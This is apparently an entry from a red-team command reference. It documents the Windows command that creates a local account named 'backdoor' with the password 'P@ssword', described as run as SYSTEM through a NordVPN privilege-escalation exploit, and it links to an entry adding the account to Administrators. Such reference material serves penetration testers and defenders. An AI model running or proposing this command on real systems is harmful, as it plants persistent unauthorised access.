---
data: net user backdoor P@ssword /add
tags:
  - net
  - user-creation
  - backdoor
type: command
output: The command completed successfully
executor: cmd
platforms:
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:28.570Z'
id: 57cc03be-c64d-453a-8c8b-91246c067ccc
verified: false
validated: true
submitted: true
---
# net-user-backdoor-add

## Command

```cmd
net user backdoor P@ssword /add
```

## Description

Creates a new local user account named 'backdoor' with password 'P@ssword', executed as SYSTEM via the NordVPN exploit for privilege escalation demonstration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| username | User to create (backdoor) | Yes |
| password | Password for the user (P@ssword) | Yes |
| /add | Flag to add the user | Yes |

## Examples

### Basic Usage

```cmd
net user backdoor P@ssword /add
```

### Advanced Usage

```cmd
net user backdoor P@ssword /add /fullname:"Backdoor Account" /comment:"Escalated User"
```

## Expected Output

The command completed successfully.

## Related

- [[commands/net-localgroup-administrators-backdoor-add]]
- [[commands/invoke-exploitnordvpnconfiglpe-add-backdoor-user]]
